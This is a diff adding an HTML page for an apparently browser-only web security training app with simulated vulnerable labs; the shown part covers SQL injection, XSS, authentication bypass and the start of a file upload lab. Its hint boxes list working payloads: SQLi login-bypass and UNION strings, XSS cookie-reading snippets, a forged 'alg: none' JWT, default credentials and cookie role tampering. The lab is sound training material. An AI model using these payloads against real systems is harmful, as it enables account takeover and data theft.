@@ -1,0 +1,1309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VulnLabs — Browser Security Training</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700;900&display=swap');
+
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#050810;--bg2:#080c18;--bg3:#0a0e1a;--bg4:#0f1824;
+  --border:#1a2540;--border2:#1e3050;
+  --green:#00ff88;--blue:#00aaff;--yellow:#ffcc00;--red:#ff4455;--orange:#ff6b35;
+  --text:#c8d6e5;--muted:#445566;--dim:#1a2540;
+}
+body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;min-height:100vh}
+::-webkit-scrollbar{width:4px;background:var(--bg3)}
+::-webkit-scrollbar-thumb{background:#00ff8822;border-radius:4px}
+
+/* ── SCANLINE ── */
+body::before{content:'';pointer-events:none;position:fixed;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.04) 2px,rgba(0,0,0,.04) 4px);
+  z-index:9999}
+
+/* ── NAV ── */
+#nav{position:fixed;top:0;left:0;right:0;height:52px;background:rgba(5,8,16,.95);
+  border-bottom:1px solid var(--border);display:flex;align-items:center;
+  padding:0 20px;gap:0;z-index:100;backdrop-filter:blur(8px)}
+.nav-logo{font-family:'Orbitron',monospace;font-size:14px;font-weight:900;color:var(--green);
+  letter-spacing:2px;margin-right:24px;text-shadow:0 0 15px var(--green)}
+.nav-tabs{display:flex;gap:2px;overflow-x:auto;flex:1}
+.nav-tab{padding:6px 14px;font-size:11px;font-family:inherit;background:none;
+  border:1px solid transparent;border-radius:4px;color:var(--muted);cursor:pointer;
+  white-space:nowrap;letter-spacing:1px;transition:all .15s;text-transform:uppercase}
+.nav-tab:hover{color:var(--text);border-color:var(--border2)}
+.nav-tab.active{color:var(--green);border-color:var(--green);background:#00ff8812}
+.nav-badge{font-size:9px;padding:1px 5px;background:#ff445522;border:1px solid #ff445540;
+  color:var(--red);border-radius:3px;margin-left:6px;letter-spacing:1px}
+
+/* ── MAIN ── */
+#main{margin-top:52px;min-height:calc(100vh - 52px)}
+.lab{display:none;padding:32px 28px;max-width:900px;margin:0 auto;animation:fadeIn .2s ease}
+.lab.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* ── LAB HEADER ── */
+.lab-header{margin-bottom:28px;padding-bottom:20px;border-bottom:1px solid var(--border)}
+.lab-eyebrow{font-size:10px;color:var(--muted);letter-spacing:3px;text-transform:uppercase;margin-bottom:8px}
+.lab-title{font-family:'Orbitron',monospace;font-size:26px;font-weight:900;color:var(--green);
+  letter-spacing:2px;text-shadow:0 0 20px #00ff8840;margin-bottom:10px}
+.lab-desc{font-size:12px;color:var(--muted);line-height:1.8;max-width:640px}
+.lab-tags{display:flex;gap:6px;flex-wrap:wrap;margin-top:12px}
+.lab-tag{font-size:9px;padding:3px 8px;border-radius:3px;background:var(--bg4);
+  border:1px solid var(--border);color:var(--muted);letter-spacing:.5px}
+
+/* ── HINT BOX ── */
+.hint{background:#00ff8808;border:1px solid #00ff8830;border-radius:6px;
+  padding:14px 16px;margin-bottom:20px;font-size:11px;line-height:1.8;color:#66bb88}
+.hint strong{color:var(--green)}
+.hint code{background:#00ff8815;padding:1px 6px;border-radius:3px;color:var(--green);font-size:10px}
+
+/* ── VULN APP WRAPPER ── */
+.app-frame{background:var(--bg2);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:20px}
+.app-bar{background:var(--bg3);border-bottom:1px solid var(--border);padding:10px 16px;
+  display:flex;align-items:center;gap:8px;font-size:11px;color:var(--muted)}
+.app-dot{width:10px;height:10px;border-radius:50%}
+.app-url{flex:1;background:var(--bg4);border:1px solid var(--border);border-radius:4px;
+  padding:4px 10px;font-size:10px;color:var(--muted);margin:0 8px}
+.app-body{padding:24px}
+
+/* ── FORM ELEMENTS ── */
+.field{margin-bottom:16px}
+.field label{display:block;font-size:11px;color:var(--muted);margin-bottom:6px;letter-spacing:1px;text-transform:uppercase}
+.field input,.field textarea,.field select{width:100%;padding:10px 14px;background:var(--bg3);
+  border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:inherit;
+  font-size:12px;outline:none;transition:border-color .15s}
+.field input:focus,.field textarea:focus{border-color:var(--blue)}
+.field textarea{resize:vertical;min-height:80px}
+.btn{padding:10px 22px;border-radius:5px;font-family:inherit;font-size:12px;
+  cursor:pointer;transition:all .15s;letter-spacing:1px;font-weight:700;border:none}
+.btn-primary{background:var(--green);color:#050810}
+.btn-primary:hover{background:#00dd77;box-shadow:0 0 20px #00ff8840}
+.btn-danger{background:#ff445520;border:1px solid #ff445540;color:var(--red)}
+.btn-danger:hover{background:#ff445530}
+.btn-blue{background:#00aaff20;border:1px solid #00aaff40;color:var(--blue)}
+.btn-blue:hover{background:#00aaff30}
+
+/* ── OUTPUT ── */
+.output{margin-top:16px;background:var(--bg3);border:1px solid var(--border);
+  border-radius:6px;padding:14px 16px;font-size:12px;line-height:1.8;min-height:48px;
+  display:none}
+.output.show{display:block}
+.output.success{border-color:#00ff8840;color:var(--green)}
+.output.error{border-color:#ff445540;color:var(--red)}
+.output.warning{border-color:#ffcc0040;color:var(--yellow)}
+.output.info{border-color:#00aaff40;color:var(--blue)}
+
+/* ── TABLE ── */
+.vuln-table{width:100%;border-collapse:collapse;font-size:11px;margin-top:12px}
+.vuln-table th{text-align:left;padding:8px 12px;background:var(--bg4);
+  color:var(--muted);border-bottom:1px solid var(--border);letter-spacing:1px;font-size:10px}
+.vuln-table td{padding:8px 12px;border-bottom:1px solid #0f1824;color:var(--text)}
+.vuln-table tr:hover td{background:#0a0e1a}
+
+/* ── PROGRESS ── */
+.progress-bar{height:4px;background:var(--bg4);border-radius:2px;overflow:hidden;margin:8px 0}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--blue));
+  border-radius:2px;transition:width .4s ease}
+
+/* ── SCORE ── */
+#score-bar{position:fixed;bottom:0;left:0;right:0;background:rgba(5,8,16,.95);
+  border-top:1px solid var(--border);padding:8px 20px;display:flex;align-items:center;
+  gap:20px;font-size:11px;z-index:100;backdrop-filter:blur(8px)}
+.score-label{color:var(--muted);letter-spacing:1px}
+.score-val{color:var(--green);font-family:'Orbitron',monospace;font-size:14px;font-weight:700}
+.score-flags{display:flex;gap:6px;flex-wrap:wrap;flex:1}
+.flag{font-size:9px;padding:2px 8px;border-radius:3px;background:#00ff8812;
+  border:1px solid #00ff8830;color:var(--green);letter-spacing:.5px}
+
+/* ── SECTIONS ── */
+.section{margin-bottom:24px}
+.section-title{font-size:10px;color:var(--muted);letter-spacing:3px;text-transform:uppercase;
+  margin-bottom:12px;padding-bottom:6px;border-bottom:1px solid var(--border)}
+
+/* ── HOME ── */
+.home-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-top:24px}
+.home-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;
+  padding:16px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+.home-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,transparent,var(--green),transparent);opacity:0;transition:.2s}
+.home-card:hover{border-color:var(--green);transform:translateY(-2px);box-shadow:0 4px 20px #00ff8815}
+.home-card:hover::before{opacity:1}
+.home-card-icon{font-size:24px;margin-bottom:10px}
+.home-card-title{font-size:13px;font-weight:700;color:var(--text);margin-bottom:4px}
+.home-card-sub{font-size:10px;color:var(--muted);line-height:1.5}
+.diff-badge{font-size:9px;padding:2px 7px;border-radius:3px;margin-top:8px;display:inline-block;letter-spacing:1px}
+.diff-b{background:#00ff8812;border:1px solid #00ff8830;color:var(--green)}
+.diff-i{background:#ffcc0012;border:1px solid #ffcc0030;color:var(--yellow)}
+.diff-a{background:#ff6b3512;border:1px solid #ff6b3530;color:var(--orange)}
+
+/* ── XSS demo ── */
+.comment-box{background:var(--bg3);border:1px solid var(--border);border-radius:6px;
+  padding:12px 14px;margin-bottom:8px}
+.comment-user{font-size:10px;color:var(--blue);margin-bottom:4px}
+.comment-body{font-size:12px;color:var(--text);line-height:1.6}
+
+/* ── Cookie display ── */
+.cookie-display{background:#0a0e1a;border:1px solid #1e3050;border-radius:5px;
+  padding:10px 14px;font-size:11px;color:#ffcc88;font-family:monospace;margin-top:8px;word-break:break-all}
+
+/* ── SQL query display ── */
+.sql-query{background:#030507;border:1px solid #1a2540;border-radius:5px;
+  padding:10px 14px;font-size:11px;color:#00ff88;font-family:monospace;
+  margin:8px 0;word-break:break-all;white-space:pre-wrap}
+
+/* tabs inside lab */
+.lab-tabs{display:flex;gap:4px;margin-bottom:16px}
+.lab-tab-btn{padding:6px 14px;font-size:11px;font-family:inherit;background:none;
+  border:1px solid var(--border);border-radius:4px;color:var(--muted);cursor:pointer;
+  transition:all .15s;letter-spacing:1px}
+.lab-tab-btn.on{color:var(--green);border-color:var(--green);background:#00ff8810}
+.lab-panel{display:none}.lab-panel.on{display:block}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav id="nav">
+  <div class="nav-logo">⬡ VULNLABS</div>
+  <div class="nav-tabs">
+    <button class="nav-tab active" onclick="showLab('home')">Home</button>
+    <button class="nav-tab" onclick="showLab('sqli')">SQLi <span class="nav-badge">HOT</span></button>
+    <button class="nav-tab" onclick="showLab('xss')">XSS</button>
+    <button class="nav-tab" onclick="showLab('auth')">Auth Bypass</button>
+    <button class="nav-tab" onclick="showLab('upload')">File Upload</button>
+    <button class="nav-tab" onclick="showLab('cmd')">CMD Inject</button>
+    <button class="nav-tab" onclick="showLab('idor')">IDOR</button>
+    <button class="nav-tab" onclick="showLab('csrf')">CSRF</button>
+    <button class="nav-tab" onclick="showLab('lfi')">LFI</button>
+    <button class="nav-tab" onclick="showLab('xxe')">XXE</button>
+    <button class="nav-tab" onclick="showLab('ssti')">SSTI</button>
+    <button class="nav-tab" onclick="showLab('redirect')">Open Redirect</button>
+  </div>
+</nav>
+
+<main id="main">
+
+<!-- ══════════════════════════════════════════════════════════════════ HOME -->
+<div id="lab-home" class="lab active">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ localhost security training</div>
+    <div class="lab-title">VULNLABS</div>
+    <div class="lab-desc">A fully browser-based vulnerable web app for practicing real web security attacks. No Docker. No server. No install. Just open and hack. Every lab simulates real vulnerabilities you'll find on bug bounty programs and pentests.</div>
+  </div>
+  <div class="section-title">Choose a Lab</div>
+  <div class="home-grid">
+    <div class="home-card" onclick="showLab('sqli')">
+      <div class="home-card-icon">🗃️</div>
+      <div class="home-card-title">SQL Injection</div>
+      <div class="home-card-sub">Classic login bypass, UNION extraction, blind boolean & time-based</div>
+      <div class="diff-badge diff-b">Beginner</div>
+    </div>
+    <div class="home-card" onclick="showLab('xss')">
+      <div class="home-card-icon">💉</div>
+      <div class="home-card-title">XSS</div>
+      <div class="home-card-sub">Reflected, stored, and DOM-based cross-site scripting with cookie theft</div>
+      <div class="diff-badge diff-b">Beginner</div>
+    </div>
+    <div class="home-card" onclick="showLab('auth')">
+      <div class="home-card-icon">🔓</div>
+      <div class="home-card-title">Auth Bypass</div>
+      <div class="home-card-sub">Weak credentials, JWT manipulation, broken password reset logic</div>
+      <div class="diff-badge diff-b">Beginner</div>
+    </div>
+    <div class="home-card" onclick="showLab('upload')">
+      <div class="home-card-icon">📤</div>
+      <div class="home-card-title">File Upload</div>
+      <div class="home-card-sub">MIME bypass, double extension, null byte, .htaccess tricks</div>
+      <div class="diff-badge diff-i">Intermediate</div>
+    </div>
+    <div class="home-card" onclick="showLab('cmd')">
+      <div class="home-card-icon">💻</div>
+      <div class="home-card-title">Command Injection</div>
+      <div class="home-card-sub">OS command injection via ping, DNS lookup, blind execution</div>
+      <div class="diff-badge diff-i">Intermediate</div>
+    </div>
+    <div class="home-card" onclick="showLab('idor')">
+      <div class="home-card-icon">👤</div>
+      <div class="home-card-title">IDOR</div>
+      <div class="home-card-sub">Access other users' data by manipulating object IDs in requests</div>
+      <div class="diff-badge diff-b">Beginner</div>
+    </div>
+    <div class="home-card" onclick="showLab('csrf')">
+      <div class="home-card-icon">🎣</div>
+      <div class="home-card-title">CSRF</div>
+      <div class="home-card-sub">Cross-site request forgery — forging requests from external origin</div>
+      <div class="diff-badge diff-b">Beginner</div>
+    </div>
+    <div class="home-card" onclick="showLab('lfi')">
+      <div class="home-card-icon">📁</div>
+      <div class="home-card-title">LFI / Path Traversal</div>
+      <div class="home-card-sub">Read sensitive files via directory traversal and PHP wrappers</div>
+      <div class="diff-badge diff-i">Intermediate</div>
+    </div>
+    <div class="home-card" onclick="showLab('xxe')">
+      <div class="home-card-icon">📄</div>
+      <div class="home-card-title">XXE Injection</div>
+      <div class="home-card-sub">XML External Entity attacks — file read and SSRF via XML</div>
+      <div class="diff-badge diff-i">Intermediate</div>
+    </div>
+    <div class="home-card" onclick="showLab('ssti')">
+      <div class="home-card-icon">🧩</div>
+      <div class="home-card-title">SSTI</div>
+      <div class="home-card-sub">Server-side template injection via Jinja2/Twig expression eval</div>
+      <div class="diff-badge diff-a">Advanced</div>
+    </div>
+    <div class="home-card" onclick="showLab('redirect')">
+      <div class="home-card-icon">↪️</div>
+      <div class="home-card-title">Open Redirect</div>
+      <div class="home-card-sub">URL parameter manipulation for phishing and token theft</div>
+      <div class="diff-badge diff-b">Beginner</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ SQL INJECTION -->
+<div id="lab-sqli" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 01 — SQL Injection</div>
+    <div class="lab-title">SQL INJECTION</div>
+    <div class="lab-desc">The app directly concatenates user input into SQL queries. Bypass authentication, extract data, and exploit blind injection. The backend "database" is simulated in JS so you can see exactly what the query looks like.</div>
+    <div class="lab-tags">
+      <span class="lab-tag">Auth Bypass</span><span class="lab-tag">UNION</span>
+      <span class="lab-tag">Blind SQLi</span><span class="lab-tag">Error-Based</span>
+    </div>
+  </div>
+
+  <div class="lab-tabs">
+    <button class="lab-tab-btn on" onclick="sqliTab('login')">Login Bypass</button>
+    <button class="lab-tab-btn" onclick="sqliTab('search')">Data Extraction</button>
+    <button class="lab-tab-btn" onclick="sqliTab('blind')">Blind SQLi</button>
+  </div>
+
+  <!-- Login Bypass -->
+  <div id="sqli-login" class="lab-panel on">
+    <div class="hint">
+      <strong>Goal:</strong> Log in as admin without knowing the password.<br>
+      <strong>Hint:</strong> Try <code>' OR '1'='1</code> or <code>admin'--</code> in the username field.
+    </div>
+    <div class="app-frame">
+      <div class="app-bar">
+        <div class="app-dot" style="background:#ff5f57"></div>
+        <div class="app-dot" style="background:#ffbd2e"></div>
+        <div class="app-dot" style="background:#28ca41"></div>
+        <div class="app-url">http://localhost/login.php</div>
+      </div>
+      <div class="app-body">
+        <div style="max-width:340px">
+          <div style="font-size:18px;font-weight:700;color:var(--text);margin-bottom:20px">🔐 Member Login</div>
+          <div class="field"><label>Username</label><input id="sqli-user" placeholder="Enter username" value="admin"></div>
+          <div class="field"><label>Password</label><input id="sqli-pass" type="password" placeholder="Enter password" value="wrongpassword"></div>
+          <button class="btn btn-primary" onclick="sqliLogin()">Login →</button>
+          <div class="sql-query" id="sqli-query" style="margin-top:16px">SELECT * FROM users WHERE username='admin' AND password='wrongpassword'</div>
+          <div class="output" id="sqli-out"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Data Extraction -->
+  <div id="sqli-search" class="lab-panel">
+    <div class="hint">
+      <strong>Goal:</strong> Extract all users from the database using UNION injection.<br>
+      <strong>Hint:</strong> Try <code>1 UNION SELECT username,password,email FROM users--</code>
+    </div>
+    <div class="app-frame">
+      <div class="app-bar">
+        <div class="app-dot" style="background:#ff5f57"></div>
+        <div class="app-dot" style="background:#ffbd2e"></div>
+        <div class="app-dot" style="background:#28ca41"></div>
+        <div class="app-url">http://localhost/products.php?id=1</div>
+      </div>
+      <div class="app-body">
+        <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:16px">🛒 Product Search</div>
+        <div style="display:flex;gap:10px;margin-bottom:16px">
+          <input id="sqli-prod-id" style="flex:1;padding:8px 12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:inherit;font-size:12px;outline:none" placeholder="Product ID (try: 1)" value="1">
+          <button class="btn btn-primary" onclick="sqliSearch()">Search</button>
+        </div>
+        <div class="sql-query" id="sqli-search-query">SELECT id,name,price FROM products WHERE id=1</div>
+        <div id="sqli-search-out" style="margin-top:12px"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Blind SQLi -->
+  <div id="sqli-blind" class="lab-panel">
+    <div class="hint">
+      <strong>Goal:</strong> Use boolean-based blind SQLi to determine if a condition is true.<br>
+      <strong>Hint:</strong> Try <code>1 AND 1=1--</code> (true) vs <code>1 AND 1=2--</code> (false). Then <code>1 AND SUBSTRING(password,1,1)='s'--</code>
+    </div>
+    <div class="app-frame">
+      <div class="app-bar">
+        <div class="app-dot" style="background:#ff5f57"></div>
+        <div class="app-dot" style="background:#ffbd2e"></div>
+        <div class="app-dot" style="background:#28ca41"></div>
+        <div class="app-url">http://localhost/user.php?id=1</div>
+      </div>
+      <div class="app-body">
+        <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:16px">👤 User Profile Lookup</div>
+        <div style="display:flex;gap:10px;margin-bottom:16px">
+          <input id="sqli-blind-in" style="flex:1;padding:8px 12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:inherit;font-size:12px;outline:none" placeholder="User ID" value="1">
+          <button class="btn btn-primary" onclick="sqliBlind()">Lookup</button>
+        </div>
+        <div class="sql-query" id="sqli-blind-query">SELECT username FROM users WHERE id=1</div>
+        <div class="output show info" id="sqli-blind-out">User exists: <strong>admin</strong></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ XSS -->
+<div id="lab-xss" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 02 — Cross-Site Scripting</div>
+    <div class="lab-title">XSS</div>
+    <div class="lab-desc">User input is reflected or stored without sanitization. Inject JavaScript to steal cookies, deface the page, or redirect users. Payloads actually execute in this lab — be careful with alerts!</div>
+    <div class="lab-tags">
+      <span class="lab-tag">Reflected XSS</span><span class="lab-tag">Stored XSS</span>
+      <span class="lab-tag">DOM XSS</span><span class="lab-tag">Cookie Theft</span>
+    </div>
+  </div>
+
+  <div class="lab-tabs">
+    <button class="lab-tab-btn on" onclick="xssTab('reflected')">Reflected</button>
+    <button class="lab-tab-btn" onclick="xssTab('stored')">Stored</button>
+    <button class="lab-tab-btn" onclick="xssTab('dom')">DOM-Based</button>
+  </div>
+
+  <!-- Reflected XSS -->
+  <div id="xss-reflected" class="lab-panel on">
+    <div class="hint">
+      <strong>Goal:</strong> Inject a script that executes in the search results.<br>
+      <strong>Payloads to try:</strong><br>
+      <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
+      <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code><br>
+      <code>&lt;svg onload=alert(1)&gt;</code>
+    </div>
+    <div class="app-frame">
+      <div class="app-bar">
+        <div class="app-dot" style="background:#ff5f57"></div>
+        <div class="app-dot" style="background:#ffbd2e"></div>
+        <div class="app-dot" style="background:#28ca41"></div>
+        <div class="app-url">http://localhost/search.php?q=<span id="xss-url-preview">hello</span></div>
+      </div>
+      <div class="app-body">
+        <div style="display:flex;gap:10px;margin-bottom:20px">
+          <input id="xss-ref-in" style="flex:1;padding:8px 12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:inherit;font-size:12px;outline:none" placeholder="Search..." value="hello" oninput="document.getElementById('xss-url-preview').textContent=this.value">
+          <button class="btn btn-primary" onclick="xssReflected()">Search</button>
+        </div>
+        <div style="font-size:12px;color:var(--muted);margin-bottom:10px">Search results for:</div>
+        <div id="xss-ref-out" style="font-size:14px;color:var(--text);padding:10px;background:var(--bg3);border-radius:5px;border:1px solid var(--border)">hello</div>
+        <div class="cookie-display" style="margin-top:12px">🍪 document.cookie = "session=abc123xyz; user=guest; role=user"</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Stored XSS -->
+  <div id="xss-stored" class="lab-panel">
+    <div class="hint">
+      <strong>Goal:</strong> Post a comment that executes JavaScript for every visitor.<br>
+      <strong>Payload:</strong> <code>&lt;script&gt;alert('Stored XSS - victim cookie: '+document.cookie)&lt;/script&gt;</code><br>
+      <code>&lt;img src=x onerror="document.body.style.background='red'"&gt;</code>
+    </div>
+    <div class="app-frame">
+      <div class="app-bar">
+        <div class="app-dot" style="background:#ff5f57"></div>
+        <div class="app-dot" style="background:#ffbd2e"></div>
+        <div class="app-dot" style="background:#28ca41"></div>
+        <div class="app-url">http://localhost/blog/post-comments.php</div>
+      </div>
+      <div class="app-body">
+        <div style="font-size:16px;font-weight:700;color:var(--text);margin-bottom:16px">📝 Blog Comments</div>
+        <div id="xss-comments">
+          <div class="comment-box">
+            <div class="comment-user">alice · 2 hours ago</div>
+            <div class="comment-body">Great article! Really helpful.</div>
+          </div>
+          <div class="comment-box">
+            <div class="comment-user">bob · 1 hour ago</div>
+            <div class="comment-body">Thanks for sharing this.</div>
+          </div>
+        </div>
+        <div style="margin-top:16px">
+          <div class="field"><label>Your Name</label><input id="xss-name" value="hacker"></div>
+          <div class="field"><label>Comment</label><textarea id="xss-comment" placeholder="Write a comment..."></textarea></div>
+          <button class="btn btn-primary" onclick="xssStored()">Post Comment</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DOM XSS -->
+  <div id="xss-dom" class="lab-panel">
+    <div class="hint">
+      <strong>Goal:</strong> Exploit DOM XSS via the URL hash fragment.<br>
+      <strong>Payload:</strong> Change the URL hash to <code>#&lt;img src=x onerror=alert('DOM XSS')&gt;</code><br>
+      The page reads <code>location.hash</code> and writes it directly to <code>innerHTML</code>.
+    </div>
+    <div class="app-frame">
+      <div class="app-bar">
+        <div class="app-dot" style="background:#ff5f57"></div>
+        <div class="app-dot" style="background:#ffbd2e"></div>
+        <div class="app-dot" style="background:#28ca41"></div>
+        <div class="app-url">http://localhost/welcome.php#<span id="dom-hash-display">guest</span></div>
+      </div>
+      <div class="app-body">
+        <div style="font-size:12px;color:var(--muted);margin-bottom:12px">Simulate the URL hash value:</div>
+        <div style="display:flex;gap:10px;margin-bottom:16px">
+          <input id="xss-dom-in" style="flex:1;padding:8px 12px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;color:var(--text);font-family:inherit;font-size:12px;outline:none" placeholder="Enter hash value..." value="guest" oninput="document.getElementById('dom-hash-display').textContent=this.value">
+          <button class="btn btn-primary" onclick="xssDOM()">Load Page</button>
+        </div>
+        <div style="padding:16px;background:var(--bg3);border:1px solid var(--border);border-radius:6px">
+          <div style="font-size:12px;color:var(--muted);margin-bottom:8px">// Page JS: document.getElementById('name').innerHTML = location.hash.slice(1)</div>
+          <div style="font-size:16px">Welcome, <span id="xss-dom-out">guest</span>!</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ AUTH BYPASS -->
+<div id="lab-auth" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 03 — Authentication Bypass</div>
+    <div class="lab-title">AUTH BYPASS</div>
+    <div class="lab-desc">Weak authentication implementations — default credentials, JWT none algorithm, broken password reset, and role manipulation via cookies.</div>
+    <div class="lab-tags">
+      <span class="lab-tag">Default Creds</span><span class="lab-tag">JWT</span>
+      <span class="lab-tag">Password Reset</span><span class="lab-tag">Cookie Manipulation</span>
+    </div>
+  </div>
+
+  <div class="lab-tabs">
+    <button class="lab-tab-btn on" onclick="authTab('creds')">Default Creds</button>
+    <button class="lab-tab-btn" onclick="authTab('jwt')">JWT Bypass</button>
+    <button class="lab-tab-btn" onclick="authTab('reset')">Password Reset</button>
+    <button class="lab-tab-btn" onclick="authTab('cookie')">Cookie Tamper</button>
+  </div>
+
+  <div id="auth-creds" class="lab-panel on">
+    <div class="hint">
+      <strong>Goal:</strong> Log in using common default credentials.<br>
+      <strong>Try:</strong> <code>admin/admin</code> · <code>admin/password</code> · <code>root/root</code> · <code>administrator/1234</code>
+    </div>
+    <div class="app-frame">
+      <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/admin/login.php</div></div>
+      <div class="app-body" style="max-width:340px">
+        <div style="font-size:16px;font-weight:700;color:var(--text);margin-bottom:20px">⚙️ Admin Panel</div>
+        <div class="field"><label>Username</label><input id="auth-user" value="admin"></div>
+        <div class="field"><label>Password</label><input id="auth-pass" type="password" value="admin"></div>
+        <button class="btn btn-primary" onclick="authCreds()">Login</button>
+        <div class="output" id="auth-creds-out" style="margin-top:12px"></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="auth-jwt" class="lab-panel">
+    <div class="hint">
+      <strong>Goal:</strong> Forge a JWT token with <code>alg: none</code> to become admin.<br>
+      <strong>How it works:</strong> The server accepts tokens with no signature if <code>"alg":"none"</code>.<br>
+      Decoded payload: <code>{"user":"guest","role":"user"}</code> → change to <code>{"user":"admin","role":"admin"}</code>
+    </div>
+    <div class="app-frame">
+      <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/api/profile</div></div>
+      <div class="app-body">
+        <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:16px">🪙 JWT Token Tester</div>
+        <div class="field"><label>JWT Token (edit me)</label><input id="jwt-in" value="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature"></div>
+        <div style="font-size:10px;color:var(--muted);margin-bottom:12px">Forge: <code style="color:var(--green)">eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.</code></div>
+        <button class="btn btn-primary" onclick="authJWT()">Send Request</button>
+        <div class="output" id="auth-jwt-out" style="margin-top:12px"></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="auth-reset" class="lab-panel">
+    <div class="hint">
+      <strong>Goal:</strong> Reset any user's password by exploiting a predictable token.<br>
+      <strong>Hint:</strong> The reset token is just <code>base64(username + timestamp)</code>. Try requesting a reset for <code>admin</code> and manipulating the token.
+    </div>
+    <div class="app-frame">
+      <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/forgot-password.php</div></div>
+      <div class="app-body">
+        <div style="font-size:16px;font-weight:700;color:var(--text);margin-bottom:16px">🔑 Password Reset</div>
+        <div class="field"><label>Email / Username</label><input id="reset-user" value="admin"></div>
+        <button class="btn btn-blue" onclick="resetRequest()">Send Reset Link</button>
+        <div class="output" id="reset-link-out" style="margin-top:12px"></div>
+        <div style="margin-top:16px;border-top:1px solid var(--border);padding-top:16px">
+          <div class="field"><label>Reset Token (from link)</label><input id="reset-token" placeholder="Paste or forge token here..."></div>
+          <div class="field"><label>New Password</label><input id="reset-newpass" value="hacked123"></div>
+          <button class="btn btn-danger" onclick="resetSubmit()">Reset Password</button>
+          <div class="output" id="reset-out" style="margin-top:12px"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="auth-cookie" class="lab-panel">
+    <div class="hint">
+      <strong>Goal:</strong> Escalate privileges by tampering with your session cookie.<br>
+      <strong>Hint:</strong> Change <code>role=user</code> to <code>role=admin</code> in the cookie value below.
+    </div>
+    <div class="app-frame">
+      <div class="app-bar"><div class="app-dot" style="background:#ff5f57"></div><div class="app-dot" style="background:#ffbd2e"></div><div class="app-dot" style="background:#28ca41"></div><div class="app-url">http://localhost/dashboard.php</div></div>
+      <div class="app-body">
+        <div style="font-size:14px;font-weight:700;color:var(--text);margin-bottom:16px">🍪 Cookie-Based Auth</div>
+        <div class="field"><label>Simulate Cookie Value</label><input id="cookie-in" value="session=abc123; role=user; user=bob"></div>
+        <button class="btn btn-primary" onclick="cookieTamper()">Send Request</button>
+        <div class="output" id="cookie-out" style="margin-top:12px"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════ FILE UPLOAD -->
+<div id="lab-upload" class="lab">
+  <div class="lab-header">
+    <div class="lab-eyebrow">◈ Lab 04 — File Upload Bypass</div>
+    <div class="lab-title">FILE UPLOAD</div>
+    <div class="lab-desc">The upload function validates files incorrectly. Bypass client-side checks, MIME type validation, and extension blacklists to upload a web shell.</div>
+    <div class="lab-tags">
+      <span class="lab-tag">MIME Bypass</span><span class="lab-tag">Double Extension</span>
+      <span class="lab-tag">Null Byte</span><span class="lab-tag">WebShell</span>
+    </div>
+  </div>
+
+  <div class="lab-tabs">
+    <button class="lab-tab-btn on" onclick="uploadTab('mime')">MIME Bypass</button>
+    <button class="lab-tab-btn" onclick="uploadTab('ext')">Extension Tricks</button>
+    <button class="lab-tab-btn" onclick="uploadTab('shell')">Web Shell</button>
+  </div>
+
+  <div id="upload-mime" class="lab-panel on">
+    <div class="hint">
+      <strong>Goal:</strong> Upload a PHP file disguised as an image.<br>
+      <strong>Method:</strong> Select "php" type but set Content-Type to <code>image/jpeg</code>.<br>
